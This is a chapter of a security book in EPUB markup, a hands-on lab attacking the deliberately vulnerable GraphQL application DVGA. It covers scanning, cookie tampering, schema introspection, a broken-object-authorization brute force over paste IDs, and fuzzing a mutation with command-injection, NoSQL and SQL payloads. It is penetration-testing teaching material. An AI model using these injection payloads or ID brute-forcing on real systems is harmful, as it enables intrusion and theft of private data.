<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 14: Attacking GraphQL</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:4817cf93-40a6-403c-8355-e951c69da606" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_285" title="285"/>14</span><br/>
<span class="ChapterTitle">Attacking GraphQL</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">This chapter will guide you through the process of attacking the Damn Vulnerable GraphQL Application (DVGA) using the API hacking techniques we’ve covered so far. We’ll begin with active reconnaissance, transition to API analysis, and conclude by attempting various attacks against the application.</p>
<p>As you’ll see, there are some major differences between the RESTful APIs we’ve been working with throughout this book and GraphQL APIs. I will guide you through these differences and demonstrate how we can leverage the same hacking techniques by adapting them to GraphQL. In the process, you’ll get a sense of how you might apply your new skills to emerging web API formats.</p>
<p>You should treat this chapter as a hands-on lab. If you would like to follow along, make sure your hacking lab includes DVGA. For more information regarding setting up DVGA, return to <span class="xref" itemid="xref_target_Chapter 5">Chapter 5</span>.</p>
<h2 id="h1-502444c14-0001"><span epub:type="pagebreak" id="Page_286" title="286"/>GraphQL Requests and IDEs</h2>
<p class="BodyFirst">In <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span>, we covered some of the basics of how GraphQL works. In this section, we’ll discuss how to use and attack GraphQL. As you proceed, remember that GraphQL more closely resembles SQL than REST APIs. Because GraphQL is a query language, using it is really just querying a database with more steps. Let’s look the request in <a href="#listing14-1" id="listinganchor14-1">Listing 14-1</a> and its response in <a href="#listing14-2" id="listinganchor14-2">Listing 14-2</a>.</p>
<pre><code>
POST /v1/graphql
<var>--snip--</var>
query products (price: "10.00") {
       name
price
}</code></pre>
<p class="CodeListingCaption"><a id="listing14-1">Listing 14-1</a>: A GraphQL request</p>
<pre><code>
200 OK
{
"data": {
"products": [
{
"product_name": "Seat",
"price": "10.00",
"product_name": "Wheel",
"price": "10.00"
}]}</code></pre>
<p class="CodeListingCaption"><a id="listing14-2">Listing 14-2</a>: A GraphQL response</p>
<p>Unlike REST APIs, GraphQL APIs don’t use a variety of endpoints to represent where resources are located. Instead, all requests use POST and get sent to a single endpoint. The request body will contain the query and mutation, along with the requested types.</p>
<p>Remember from <span class="xref" itemid="xref_target_Chapter 2">Chapter 2</span> that the GraphQL <em>schema</em> is the shape in which the data is organized. The schema consists of types and fields. The <em>types</em> (<code>query</code>, <code>mutation</code>, and<b> </b><code>subscription</code>) are the basic methods consumers can use to interact with GraphQL. While REST APIs use the HTTP request methods GET, POST, PUT, and DELETE to implement CRUD (create, read, update, delete) functionality, GraphQL instead uses <code>query</code> (to read) and <code>mutation</code> (to create, update, and delete). We won’t be using <code>subscription</code> in this chapter, but it is essentially a connection made to the GraphQL server that allows the consumer to receive real-time updates. You can actually build out a GraphQL request that performs both a query and mutation, allowing you to read and write in a single request.</p>
<p><em>Queries</em> begin with an object type. In our example, the object type is <code>products</code>. Object types contain one or more fields providing data about the object, such as <code>name</code> and <code>price</code> in our example. GraphQL queries can also <span epub:type="pagebreak" id="Page_287" title="287"/>contain arguments within parentheses, which help narrow down the fields you’re looking for. For instance, the argument in our sample request specifies that the consumer only wants products that have the price <code>"10.00"</code>.</p>
<p>As you can see, GraphQL responded to the successful query with the exact information requested. Many GraphQL APIs will respond to all requests with an HTTP 200 response, regardless of whether the query was successful. Whereas you would receive a variety of error response codes with a REST API, GraphQL will often send a 200 response and include the error within the response body.</p>
<p>Another major difference between REST and GraphQL is that it is fairly common for GraphQL providers to make an integrated development environment (IDE) available over their web application. A GraphQL IDE is a graphical interface that can be used to interact with the API. Some of the most common GraphQL IDEs are GraphiQL, GraphQL Playground, and the Altair Client. These GraphQL IDEs consist of a window to craft queries, a window to submit requests, a window for responses, and a way to reference the GraphQL documentation.</p>
<p>Later in this chapter, we will cover enumerating GraphQL with queries and mutations. For more information about GraphQL, check out the GraphQL guide at <a class="LinkURL" href="https://graphql.org/learn">https://graphql.org/learn</a> and the additional resources provided by Dolev Farhi in the DVGA GitHub Repo.</p>
<h2 id="h1-502444c14-0002">Active Reconnaissance</h2>
<p class="BodyFirst">Let’s begin by actively scanning DVGA for any information we can gather about it. If you were trying to uncover an organization’s attack surface rather than attacking a deliberately vulnerable application, you might begin with passive reconnaissance instead.</p>
<h3 id="h2-502444c14-0001">Scanning</h3>
<p class="BodyFirst">Use an Nmap scan to learn about the target host. From the following scan, we can see that port 5000 is open, has HTTP running on it, and uses a web application library called Werkzeug version 1.0.1:</p>
<pre><code>$ <b>nmap -sC -sV 192.168.195.132</b>
Starting Nmap 7.91 ( https://nmap.org ) at 10-04 08:13 PDT
Nmap scan report for 192.168.195.132
Host is up (0.00046s latency).
Not shown: 999 closed ports
PORT      STATE    SERVICE    VERSION
<b>5000/tcp open </b><b>   </b><b> </b>   <b>http    </b>  <b>Werkzeug httpd 1.0.1 (Python 3.7.12)</b>
<b>|_http-server-header: Werkzeug/1.0.1 Python/3.7.12</b>
<b>|_http-title: Damn Vulnerable GraphQL Application</b></code></pre>
<p>The most important piece of information here is found in the <code>http-title</code>, which gives us a hint that we’re working with a GraphQL application. You won’t typically find indications like this in the wild, so we will ignore it for <span epub:type="pagebreak" id="Page_288" title="288"/>now. You might follow this scan with an all-ports scan to search for additional information.</p>
<p>Now it’s time to perform more targeted scans. Let’s run a quick web application vulnerability scan using Nikto, making sure to specify that the web application is operating over port 5000:</p>
<pre><code>$ <b>nikto -h 192.168.195.132:5000</b>
---------------------------------------------------------------------------
+ Target IP:          192.168.195.132
+ Target Hostname:    192.168.195.132
+ Target Port:        5000
---------------------------------------------------------------------------
+ Server: Werkzeug/1.0.1 Python/3.7.12
+ Cookie env created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /static/favicon.ico, inode: 1633359027.0, size: 15406, mtime: 2525694601
+ Allowed HTTP Methods: OPTIONS, HEAD, GET
+ 7918 requests: 0 error(s) and 6 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested</code></pre>
<p>Nikto tells us that the application may have some security misconfigurations, such as the missing <code>X-Frame-Options</code> and undefined <code>X-XSS-Protection</code> headers. In addition, we’ve found that the OPTIONS, HEAD, and GET methods are allowed. Since Nikto did not pick up any interesting directories, we should check out the web application in a browser and see what we can find as an end user. Once we have thoroughly explored the web app, we can perform a directory brute-force attack to see if we can find any other directories.</p>
<h3 id="h2-502444c14-0002">Viewing DVGA in a Browser</h3>
<p class="BodyFirst">As you can see in <a href="#figure14-1" id="figureanchor14-1">Figure 14-1</a>, the DVGA web page describes a deliberately vulnerable GraphQL application.</p>
<p>Make sure to use the site as any other user would by clicking the links located on the web page. Explore the Private Pastes, Public Pastes, Create Paste, Import Paste, and Upload Paste links. In the process, you should begin to see a few interesting items, such as usernames, forum posts that include IP addresses and <code>user-agent</code> info, a link for uploading files, and a link for creating forum posts. Already we have a bundle of information that could prove useful in our upcoming attacks.</p>
<span epub:type="pagebreak" id="Page_289" title="289"/><figure>
<img alt="Screenshot of the Damn Vulnerable GraphQL Application homepage. Shows welcome and getting started messages. A sidebar shows tabs for Home, Private Pastes, and Public Pastes." class="keyline" src="image_fi/502444c14/F14001.png"/>
<figcaption><p><a id="figure14-1">Figure 14-1</a>: The DVGA landing page</p></figcaption>
</figure>
<h3 id="h2-502444c14-0003">Using DevTools</h3>
<p class="BodyFirst">Now that we’ve explored the site as an average user, let’s take a peek under the hood of the web application using DevTools. To see the different resources involved in this web application, navigate to the DVGA home page and open the Network module in DevTools. Refresh the Network module by pressing <span class="KeyCaps">ctrl</span>-R. You should see something like the interface shown in <a href="#figure14-2" id="figureanchor14-2">Figure 14-2</a>.</p>
<figure>
<img alt="Screenshot of the DevTools Network tab with a list of the headers sent in a request to the DVGA home page. The header “Set-Cookie: env=graphiql:disable; Path=/” is highlighted." class="keyline" src="image_fi/502444c14/F14002.png"/>
<figcaption><p><a id="figure14-2">Figure 14-2</a>: The DVGA home page’s network source file</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_290" title="290"/>Look through the response headers of the primary resource. You should see the header <code>Set-Cookie: env=graphiql:disable</code>, another indication that we’re interacting with a target that uses GraphQL. Later, we may be able to manipulate a cookie like this one to enable a GraphQL IDE called GraphiQL.</p>
<p>Back in your browser, navigate to the Public Pastes page, open up the DevTools Network module, and refresh again (see <a href="#figure14-3" id="figureanchor14-3">Figure 14-3</a>).</p>
<figure>
<img alt="Screenshot of the DevTools Network tab set to the Preview menu. Shows the source code for the DVGA Public Pastes page." class="keyline" src="image_fi/502444c14/F14003.png"/>
<figcaption><p><a id="figure14-3">Figure 14-3</a>: DVGA <em>public_pastes</em> source</p></figcaption>
</figure>
<p>There is a new source file called <em>graphql</em>. Select this source and choose the Preview tab. Now you will see a preview of the response for this resource. GraphQL, like REST, uses JSON as the syntax for transferring data. At this point, you may have guessed that this is a response generated using GraphQL.</p>
<h2 id="h1-502444c14-0003">Reverse Engineering the GraphQL API</h2>
<p class="BodyFirst">Now that we know the target app uses GraphQL, let’s try to determine the API’s endpoint and requests. Unlike REST APIs, whose resources are available at various endpoints, a host that uses GraphQL relies on only a single endpoint for its API. In order to interact with the GraphQL API, we must first find this endpoint and then figure out what we can query for.</p>
<h3 id="h2-502444c14-0004">Directory Brute-Forcing for the GraphQL Endpoint</h3>
<p class="BodyFirst">A directory brute-force scan using Gobuster or Kiterunner can tell us if there are any GraphQL-related directories. Let’s use Kiterunner to find these. If you were searching for GraphQL directories manually, you could add keywords like the following in the requested path:</p>
<ol class="none">
<li><em>/graphql</em></li>
<li><em>/v1/graphql</em></li>
<li><em>/api/graphql</em></li>
<li><em>/v1/api/graphql</em></li>
<li><span epub:type="pagebreak" id="Page_291" title="291"/><em>/graph</em></li>
<li><em>/v1/graph</em></li>
<li><em>/graphiql</em></li>
<li><em>/v1/graphiql</em></li>
<li><em>/console</em></li>
<li><em>/query</em></li>
<li><em>/graphql/console</em></li>
<li><em>/altair</em></li>
<li><em>/playground</em></li>
</ol>
<p>Of course, you should also try replacing the version numbers in any of these paths with <em>/v2</em>, <em>/v3</em>, <em>/test</em>,<em> /internal</em>, <em>/mobile</em>, <em>/legacy</em>, or any variation of these paths. For example, both Altair and Playground are alternative IDEs to GraphiQL that you could search for with various versioning in the path.</p>
<p>SecLists can also help us automate this directory search:</p>
<pre><code>$ <b>kr brute http://192.168.195.132:5000 -w /usr/share/seclists/Discovery/Web-Content/graphql.txt</b>

GET     400 [     53,    4,   1] http://192.168.195.132:5000/graphiql

GET     400 [     53,    4,   1] http://192.168.195.132:5000/graphql

5:50PM INF scan complete duration=716.265267 results=2</code></pre>
<p>We receive two relevant results from this scan; however, both currently respond with an HTTP 400 Bad Request status code. Let’s check them in the web browser. The <em>/graphql</em> path resolves to a JSON response page with the message <code>"Must provide query string."</code> (see <a href="#figure14-4" id="figureanchor14-4">Figure 14-4</a>).</p>
<figure>
<img alt="Screenshot of the /graphql path of the DVGA app. Shows the JSON message “Must provide query string.”" class="keyline" src="image_fi/502444c14/F14004.png"/>
<figcaption><p><a id="figure14-4">Figure 14-4</a>: The DVGA <em>/graphql</em> path</p></figcaption>
</figure>
<p>This doesn’t give us much to work with, so let’s check out the <em>/graphiql </em>endpoint. As you can see in <a href="#figure14-5" id="figureanchor14-5">Figure 14-5</a>, the <em>/graphiql</em> path leads us to the web IDE often used for GraphQL, GraphiQL.</p>
<span epub:type="pagebreak" id="Page_292" title="292"/><figure>
<img alt="Screenshot of the /graphiql page of the DVGA app. Shows a GraphiQL IDE." class="keyline" src="image_fi/502444c14/F14005.png"/>
<figcaption><p><a id="figure14-5">Figure 14-5</a>: The DVGA GraphiQL web IDE</p></figcaption>
</figure>
<p>However, we are met with the message <code>"400 Bad Request: GraphiQL Access Rejected"</code>.</p>
<p>In the GraphiQL web IDE, the API documentation is normally located on the top right of the page, under a button called Docs. If you click the Docs button, you should see the Documentation Explorer window, shown on the right side of <a href="#figure14-5">Figure 14-5</a>. This information could be helpful for crafting requests. Unfortunately, due to our bad request, we do not see any documentation.</p>
<p>There is a chance we’re not authorized to access the documentation due to the cookies included in our request. Let’s see if we can alter the <code>env=graphiql:disable</code> cookie we spotted back at the bottom of <a href="#figure14-2">Figure 14-2</a>.</p>
<h3 id="h2-502444c14-0005">Cookie Tampering to Enable the GraphiQL IDE</h3>
<p class="BodyFirst">Let’s capture a request to <em>/graphiql</em> using the Burp Suite Proxy to see what we’re working with. As usual, you can proxy the request to be intercepted through Burp Suite. Make sure Foxy Proxy is on and then refresh the <em>/graphiql</em> page in your browser. Here is the request you should intercept:</p>
<pre><code>GET /graphiql HTTP/1.1
Host: 192.168.195.132:5000
<em>--snip--</em>
Cookie: language=en; welcomebanner_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x; cookieconsent_status=dismiss; session=eyJkaWZmaWN1bHR5IjoiZWFzeSJ9.YWOfOA.NYaXtJpmkjyt-RazPrLj5GKg-Os; <b>env=Z3JhcGhpcWw6ZGlzYWJsZQ==</b>
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0.</code></pre>
<p>In reviewing the request, one thing you should notice is that the <code>env</code> variable is base64 encoded. Paste the value into Burp Suite’s Decoder and then decode the value as base64. You should see the decoded value as <code>graphiql:disable</code>. This is the same value we noticed when viewing DVGA in DevTools.</p>
<p><span epub:type="pagebreak" id="Page_293" title="293"/>Let’s take this value and try altering it to <code>graphiql:enable</code>. Since the original value was base64 encoded, let’s encode the new value back to base64 (see <a href="#figure14-6" id="figureanchor14-6">Figure 14-6</a>).</p>
<figure>
<img alt="Screenshot of Burp Suite’s Decoder with a string decoded to “graphiql:enable”" class="keyline" src="image_fi/502444c14/F14006.png"/>
<figcaption><p><a id="figure14-6">Figure 14-6</a>: Burp Suite’s Decoder</p></figcaption>
</figure>
<p>You can test out this updated cookie in Repeater to see what sort of response you receive. To be able to use GraphiQL in the browser, you’ll need to update the cookie saved in your browser. Open the DevTools Storage panel to edit the cookie (see <a href="#figure14-7" id="figureanchor14-7">Figure 14-7</a>).</p>
<figure>
<img alt="Screenshot of the DevTools storage panel showing a list of cookies and their values" class="keyline" src="image_fi/502444c14/F14007.png"/>
<figcaption><p><a id="figure14-7">Figure 14-7</a>: Cookies in DevTools</p></figcaption>
</figure>
<p>Once you’ve located the <code>env</code> cookie, double-click the value and replace it with the new one. Now return to the GraphiQL IDE and refresh the page. You should now be able to use the GraphiQL interface and Documentation Explorer.</p>
<h3 id="h2-502444c14-0006"><span epub:type="pagebreak" id="Page_294" title="294"/>Reverse Engineering the GraphQL Requests</h3>
<p class="BodyFirst">Although we know the endpoints we want to target, we still don’t know the structure of the API’s requests. One major difference between REST and GraphQL APIs is that GraphQL operates using POST requests only.</p>
<p>Let’s intercept these requests in Postman so we can better manipulate them. First, set your browser’s proxy to forward traffic to Postman. If you followed the setup instructions back in <span class="xref" itemid="xref_target_Chapter 4">Chapter 4</span>, you should be able to set FoxyProxy to “Postman.” <a href="#figure14-8" id="figureanchor14-8">Figure 14-8</a> shows Postman’s Capture requests and cookies screen.</p>
<figure>
<img alt="Screenshot of the Postman “Capture requests and cookies” page with “Capture requests” set to On" class="keyline" src="image_fi/502444c14/F14008.png"/>
<figcaption><p><a id="figure14-8">Figure 14-8</a>: Postman’s Capture requests and cookies screen</p></figcaption>
</figure>
<p>Now let’s reverse engineer this web application by manually navigating to every link and using every feature we’ve discovered. Click around and submit some data. Once you’ve thoroughly used the web app, open Postman to see what your collection looks like. You’ve likely collected requests that do not interact with the target API. Make sure to delete any that do not include either <em>/graphiql</em> or <em>/graphql</em>.</p>
<p>However, as you can see in <a href="#figure14-9" id="figureanchor14-9">Figure 14-9</a>, even if you delete all requests that don’t involve <em>/graphql</em>, their purposes aren’t so clear. In fact, many of them look identical. Because GraphQL requests function solely using the data in the body of the POST request rather than the request’s endpoint, we’ll have to review the body of the request to get an idea of what these requests do.</p>
<span epub:type="pagebreak" id="Page_295" title="295"/><figure>
<img alt="Screenshot of identical-looking POST requests saved in Postman" class="keyline" src="image_fi/502444c14/F14009.png"/>
<figcaption><p><a id="figure14-9">Figure 14-9</a>: An unclear GraphQL Postman collection</p></figcaption>
</figure>
<p>Take the time to go through the body of each of these requests and then rename each request so you can see what it does. Some of the request bodies may seem intimidating; if so, extract a few key details from them and give them a temporary name until you understand them better. For instance, take the following request:</p>
<pre><code>POST http://192.168.195.132:5000/graphiql?

{"query":"\n  query IntrospectionQuery {\n    __schema {\n      queryType{ name }\n      mutationType { name }\n      subscriptionType { name }\n
<em/><em>-</em><em>-snip--</em></code></pre>
<p>There is a lot of information here, but we can pick out a few details from the beginning of the request body and give it a name (for example, Graphiql Query Introspection SubscriptionType). The next request looks very similar, but instead of <code>subscriptionType</code>, the request includes only <code>types</code>, so let’s name it based on that difference, as shown in <a href="#figure14-10" id="figureanchor14-10">Figure 14-10</a>.</p>
<figure>
<img alt="Screenshot of a list of POST requests renamed descriptively in Postman" class="keyline" src="image_fi/502444c14/F14010.png"/>
<figcaption><p><a id="figure14-10">Figure 14-10</a>: A cleaned-up DVGA collection</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_296" title="296"/>Now you have a basic collection with which to conduct testing. As you learn more about the API, you will further build your collection.</p>
<p>Before we continue, we’ll cover another method of reverse engineering GraphQL requests: obtaining the schema using introspection.</p>
<h3 id="h2-502444c14-0007">Reverse Engineering a GraphQL Collection Using Introspection</h3>
<p class="BodyFirst">Introspection is a feature of GraphQL that reveals the API’s entire schema to the consumer, making it a gold mine when it comes to information disclosure. For this reason, you’ll often find introspection disabled and will have to work a lot harder to attack the API. If, however, you can query the schema, you’ll be able to operate as though you’ve found a collection or specification file for a REST API.</p>
<p>Testing for introspection is as simple as sending an introspection query. If you’re authorized to use the DVGA GraphiQL interface, you can capture the introspection query by intercepting the requests made when loading <em>/graphiql</em>, because the GraphiQL interface sends an introspection query when populating the Documentation Explorer.</p>
<p>The full introspection query is quite large, so I’ve only included a portion here; however, you can see it in its entirety by intercepting the request yourself or checking it out on the Hacking APIs GitHub repo at <a class="LinkURL" href="https://github.com/hAPI-hacker/Hacking-APIs">https://github.com/hAPI-hacker/Hacking-APIs</a>.</p>
<pre><code>  query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      subscriptionType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        locations
        args {
          ...InputValue
        }
      }
    }
  }</code></pre>
<p>A successful GraphQL introspection query will provide you with all the types and fields contained within the schema. You can use the schema to build a Postman collection. If you’re using GraphiQL, the query will populate the GraphiQL Documentation Explorer. As you’ll see in the next sections, the GraphiQL Documentation Explorer is a tool for seeing the types, fields, and arguments available in the GraphQL documentation.</p>
<h2 id="h1-502444c14-0004"><span epub:type="pagebreak" id="Page_297" title="297"/>GraphQL API Analysis</h2>
<p class="BodyFirst">At this point, we know that we can make requests to a GraphQL endpoint and the GraphiQL interface. We’ve also reverse engineered several GraphQL requests and gained access to the GraphQL schema through the use of a successful introspection query. Let’s use the Documentation Explorer to see if there is any information we might leverage for exploitation.</p>
<h3 id="h2-502444c14-0008">Crafting Requests Using the GraphiQL Documentation Explorer</h3>
<p class="BodyFirst">Take one of the requests we reverse engineered from Postman, such as the request for Public Pastes used to generate the <em>public_pastes</em> web page, and test it out using the GraphiQL IDE. Use the Documentation Explorer to help you build your query. Under <b>Root Types</b>, select <b>Query</b>. You should see the same options displayed in <a href="#figure14-11" id="figureanchor14-11">Figure 14-11</a>.</p>
<figure>
<img alt="Screenshot of the GraphiQL IDE with a search bar open and information about query formats visible" class="keyline" src="image_fi/502444c14/F14011.png"/>
<figcaption><p><a id="figure14-11">Figure 14-11</a>: The GraphiQL Documentation Explorer</p></figcaption>
</figure>
<p>Using the GraphiQL query panel, enter <code>query</code> followed by curly brackets to initiate the GraphQL request. Now query for the public pastes field by adding <code>pastes</code> under <code>query</code> and using parentheses for the argument <code>public: true</code>. Since we’ll want to know more about the public pastes object, we’ll need to add fields to the query. Each field we add to the request will tell us more about the object. To do this, select <b>PasteObject</b> in the Documentation Explorer to view these fields. Finally, add the fields that you would like to include in your request body, separated by new lines. The fields you include represent the different data objects you should receive back from the provider. In my request I’ll add <code>title</code>, <code>content</code>, <code>public</code>, <code>ipAddr</code>, and <code>pId</code>, but feel <span epub:type="pagebreak" id="Page_298" title="298"/>free to experiment with your own fields. Your completed request body should look like this:</p>
<pre><code>query {
pastes (public: true) {
 title
     content
     public
     ipAddr
     pId
  }
}</code></pre>
<p>Send the request by using the <b>Execute Query</b> button or the shortcut <span class="KeyCaps">ctrl-enter</span>. If you’ve followed along, you should receive a response like the following:</p>
<pre><code>{
  "data": {
    "pastes": [
      {
        "id": "UGFzdGVPYmplY3Q6MTY4",
        "content": "testy",
        "ipAddr": "192.168.195.133",
        "pId": "166"
      },
      {
        "id": "UGFzdGVPYmplY3Q6MTY3",
        "content": "McTester",
        "ipAddr": "192.168.195.133",
        "pId": "165"
      }
   }
}</code></pre>
<p>Now that you have an idea of how to request data using GraphQL, let’s transition to Burp Suite and use a great extension to help us flesh out what can be done with DVGA.</p>
<h3 id="h2-502444c14-0009">Using the InQL Burp Extension</h3>
<p class="BodyFirst">Sometimes, you won’t find any GraphiQL IDE to work with on your target. Luckily for us, an amazing Burp Suite extension can help. InQL acts as an interface to GraphQL within Burp Suite. To install it, as you did for the IP Rotate extension in the previous chapter, you’ll need to select Jython in the Extender options. Refer to <span class="xref" itemid="xref_target_Chapter 13">Chapter 13</span> for the Jython installation steps.</p>
<p>Once you’ve installed InQL, select the InQL Scanner and add the URL of the GraphQL API you’re targeting (see <a href="#figure14-12" id="figureanchor14-12">Figure 14-12</a>).</p>
<p>The scanner will automatically find various queries and mutations and save them into a file structure. You can then select these saved requests and send them to Repeater for additional testing.</p>
<span epub:type="pagebreak" id="Page_299" title="299"/><figure>
<img alt="Screenshot of the InQL screenshot in Burp with the paste.query GraphQL query visible" class="keyline" src="image_fi/502444c14/F14012.png"/>
<figcaption><p><a id="figure14-12">Figure 14-12</a>: The InQL Scanner module in Burp Suite</p></figcaption>
</figure>
<p>Let’s practice testing different requests. The <code>paste.query</code> is a query used to find pastes by their paste ID (pID) code. If you posted any public pastes in the web application, you can see your pID values. What if we used an authorization attack against the pID field by requesting pIDs that were meant to be private? This would constitute a BOLA attack. Since these paste IDs appear to be sequential, we’ll want to test for any authorization restrictions preventing us from accessing the private posts of other users.</p>
<p>Right-click <code>paste.query</code> and send it to Repeater. Edit the <code>code*</code> value by replacing it with a pID that should work. I’ll use the pID 166, which I received earlier. Send the request with Repeater. You should receive a response like the following:</p>
<pre><code>HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 319
Vary: Cookie
Server: Werkzeug/1.0.1 Python/3.7.10

{
  "data": {
    "paste": {
      "owner": {
        "id": "T3duZXJPYmplY3Q6MQ=="
      },
      "burn": false,
      "Owner": {
        "id": "T3duZXJPYmplY3Q6MQ=="
      },
      "userAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Firefox/78.0",
      "pId": "166",
<span epub:type="pagebreak" id="Page_300" title="300"/>      "title": "test3",
      "ownerId": 1,
      "content": "testy",
      "ipAddr": "192.168.195.133",
      "public": true,
      "id": "UGFzdGVPYmplY3Q6MTY2"
    }
  }
}</code></pre>
<p>Sure enough, the application responds with the public paste I had previously submitted.</p>
<p>If we’re able to request pastes by pID, maybe we can brute-force the other pIDs to see if there are authorization requirements that prevent us from requesting private pastes. Send the paste request in <a href="#figure14-12">Figure 14-12</a> to Intruder and then set the pID value to be the payload position. Change the payload to a number value starting at 0 and going to 166 and then start the attack.</p>
<p>Reviewing the results reveals that we’ve discovered a BOLA vulnerability. We can see that we’ve received private data, as indicated by the <code>"public": false</code> field:</p>
<pre><code>{
  "data": {
    "paste": {
      "owner": {
        "id": "T3duZXJPYmplY3Q6MQ=="
      },
      "burn": false,
      "Owner": {
        "id": "T3duZXJPYmplY3Q6MQ=="
      },
      "userAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Firefox/78.0",
      "pId": "63",
      "title": "Imported Paste from URL - b9ae5f",
      "ownerId": 1,
      "content": "&lt;!DOCTYPE html&gt;\n&lt;html lang=en&gt; ",
      "ipAddr": "192.168.195.133",
      <b>"public": false,</b>
      "id": "UGFzdGVPYmplY3Q6NjM="
    }
  }
}</code></pre>
<p>We’re able to retrieve every private paste by requesting different pIDs. Congratulations, this is a great find! Let’s see what else we can discover.</p>
<h2 id="h1-502444c14-0005"><span epub:type="pagebreak" id="Page_301" title="301"/>Fuzzing for Command Injection</h2>
<p class="BodyFirst">Now that we’ve analyzed the API, let’s fuzz it for vulnerabilities to see if we can conduct an attack. Fuzzing GraphQL can pose an additional challenge, as most requests result in a 200 status code, even if they were formatted incorrectly. Therefore, we’ll need to look for other indicators of success.</p>
<p>You’ll find any errors in the response body, and you’ll need to build a baseline for what these look like by reviewing the responses. Check whether errors all generate the same response length, for example, or if there are other significant differences between a successful response and a failed one. Of course, you should also review error responses for information disclosures that can aid your attack.</p>
<p>Since the query type is essentially read-only, we’ll attack the mutation request types. First, let’s take one of the mutation requests, such as the <code>Mutation ImportPaste</code> request, in our DVGA collection and intercept it with Burp Suite. You should see an interface similar to <a href="#figure14-13" id="figureanchor14-13">Figure 14-13</a>.</p>
<figure>
<img alt="Screenshot of a POST request in Burp Suite with a GraphQL query in the request body" class="keyline" src="image_fi/502444c14/F14013.png"/>
<figcaption><p><a id="figure14-13">Figure 14-13</a>: An intercepted GraphQL mutation request</p></figcaption>
</figure>
<p>Send this request to Repeater to see the sort of response we should expect to see. You should receive a response like the following:</p>
<pre><code>HTTP/1.0 200 OK
Content-Type: application/json
<em>--snip--</em>

{"data":{"importPaste":{
"result":"&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=\"content-type\"content=\"text/html;charset=utf-8\"&gt;\n&lt;TITLE&gt;301 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;\n&lt;H1&gt;301 Moved&lt;/H1&gt;\nThe document has moved\n&lt;AHREF=\"<b>http://www.google.com</b>/\"&gt;here&lt;/A&gt;.\n&lt;/BODY&gt;&lt;/HTML&gt;\n"}}}</code></pre>
<p><span epub:type="pagebreak" id="Page_302" title="302"/>I happen to have tested the request by using <a class="LinkURL" href="http://www.google.com/">http://www.google.com/</a> as my URL for importing pastes; you might have a different URL in the request.</p>
<p>Now that we have an idea of how GraphQL will respond, let’s forward this request to Intruder. Take a closer look at the body of the request:</p>
<pre><code>{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n
result\n        }\n        }","variables":{"host":"google.com","port":80,"path":"/","scheme":"http"}}</code></pre>
<p>Notice that this request contains variables, each of which is preceded by <code>$</code> and followed by <code>!</code>. The corresponding keys and values are at the bottom of the request, following <code>"variables"</code>. We’ll place our payload positions here, because these values contain user input that could be passed to backend processes, making them an ideal target for fuzzing. If any of these variables lack good input validation controls, we’ll be able to detect a vulnerability and potentially exploit the weakness. We’ll place our payload positions within this variables section:</p>
<pre><code>"variables":{<b>"</b><b>host</b><b>":"</b><b>google.com§test§§test2§</b><b>"</b>,"port":80,"path":"/","scheme":"http"}}</code></pre>
<p>Next, configure your two payload sets. For the first payload, let’s take a sample of metacharacters from <span class="xref" itemid="xref_target_Chapter 12">Chapter 12</span>:</p>
<p><code>|</code></p>
<p><code>||</code></p>
<p><code>&amp;</code></p>
<p><code>&amp;&amp;</code></p>
<p><code>'</code></p>
<p><code>"</code></p>
<p><code>;</code></p>
<p><code>'"</code></p>
<p>For the second payload set, let’s use a sample of potential injection payloads, also from <span class="xref" itemid="xref_target_Chapter 12">Chapter 12</span>:</p>
<p><code>whoami</code></p>
<p><code>{"$where": "sleep(1000) "}</code></p>
<p><code>;%00</code></p>
<p><code>-- -</code></p>
<p>Finally, make sure payload encoding is disabled.</p>
<p>Now let’s run our attack against the host variable. As you can see in <a href="#figure14-14" id="figureanchor14-14">Figure 14-14</a>, the results are uniform, and there were no anomalies. All the status codes and response lengths were identical.</p>
<p>You can review the responses to see what they consisted of, but from this initial scan, there doesn’t appear to be anything interesting.</p>
<p>Now let’s target the <code>"path"</code> variable:</p>
<pre><code>"variables":{"host":"google.com","port":80,<b>"</b><b>path</b><b>":"/</b><b>§test§§test2§</b><b>"</b>,"scheme":"http"}}</code></pre>
<span epub:type="pagebreak" id="Page_303" title="303"/><figure>
<img alt="Screenshot of fuzzing results in Burp Suite showing 200 response codes only" class="keyline" src="image_fi/502444c14/F14014.png"/>
<figcaption><p><a id="figure14-14">Figure 14-14</a>: Intruder results for an attack on the host variable</p></figcaption>
</figure>
<p>We’ll use the same payloads as the first attack. As you can see in <a href="#figure14-15" id="figureanchor14-15">Figure 14-15</a>, not only do we receive a variety of response codes and lengths, but we also receive indicators of successful code execution.</p>
<figure>
<img alt="Screenshot of fuzzing results in Burp Suite showing a response body containing data returned from a GraphQL query" class="keyline" src="image_fi/502444c14/F14015.png"/>
